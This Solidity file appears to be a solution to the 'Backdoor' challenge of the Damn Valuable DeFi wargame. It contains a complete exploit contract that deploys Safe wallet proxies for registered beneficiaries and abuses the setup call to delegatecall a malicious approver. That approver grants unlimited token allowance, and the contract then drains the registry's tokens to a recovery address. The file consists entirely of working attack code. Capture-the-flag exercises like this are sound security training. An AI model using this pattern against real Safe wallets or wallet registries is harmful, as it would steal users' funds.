// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {console} from "forge-std/Test.sol";

contract BackdoorExploit {
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;
    address[] beneficiaries;

    address recovery;
    uint immutable AMOUNT_TOKENS_DISTRIBUTED;

    MaliciousApprover maliciousApprover;

    constructor(
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        DamnValuableToken _token,
        WalletRegistry walletRegistryAddress,
        address[] memory _beneficiaries,
        address recoveryAddress,
        uint amountTokensDistributed
    ) payable {
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        token = _token;
        walletRegistry = walletRegistryAddress;
        beneficiaries = _beneficiaries;

        recovery = recoveryAddress;
        AMOUNT_TOKENS_DISTRIBUTED = amountTokensDistributed;

        maliciousApprover = new MaliciousApprover();
    }

    function attack() public {
        for (uint i = 0; i < beneficiaries.length; i++) {
            address newOwner = beneficiaries[i];

            address[] memory owners = new address[](1);
            owners[0] = newOwner;

            address maliciousTo = address(maliciousApprover);
            bytes memory maliciousData = abi.encodeCall(
                maliciousApprover.approveTokens,
                (token, address(this))
            );

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    maliciousTo,
                    maliciousData,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                1,
                walletRegistry
            );

            token.transferFrom(
                address(proxy),
                address(this),
                token.balanceOf(address(proxy))
            );
        }

        token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract MaliciousApprover {
    function approveTokens(DamnValuableToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}
